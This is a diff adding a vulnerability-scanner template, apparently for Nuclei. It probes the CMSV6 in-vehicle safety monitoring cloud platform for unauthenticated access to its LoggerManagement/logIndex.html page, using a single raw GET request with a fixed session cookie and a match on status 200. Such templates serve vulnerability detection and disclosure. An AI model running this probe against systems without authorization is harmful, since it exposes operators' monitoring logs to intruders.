@@ -1,0 +1,29 @@
+id: tongtianxing-CMSV6-logIndex-unauthorized-access
+
+info:
+  name: 鸿运(通天星CMSV6车载)主动安全监控云平台logIndex存在未授权访问漏洞
+  author: candada
+  severity: high
+  description: '鸿运主动安全监控云平台实现对计算资源、存储资源、网络资源、云应用服务进行7*24小时全时区、多地域、全方位、立体式、智能化的IT运维监控，保障IT系统安全、稳定、可靠运行。鸿运(通天星CMSV6车载)主动安全监控云平台LoggerManagement/logIndex.html存在未授权访问漏洞。'
+  reference:
+    - https://mp.weixin.qq.com/s/HQOCnif2NEUJ_-B3YqU_Kg
+  tags: 2024,通天星,unauthorized-access
+
+http:
+  - raw:
+      - |+
+        GET /808gps/LoggerManagement/logIndex.html HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Cookie: language=zh; JSESSIONID=FFAA1440985C74FFCB8B6A9A0004E053
+        Upgrade-Insecure-Requests: 1
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
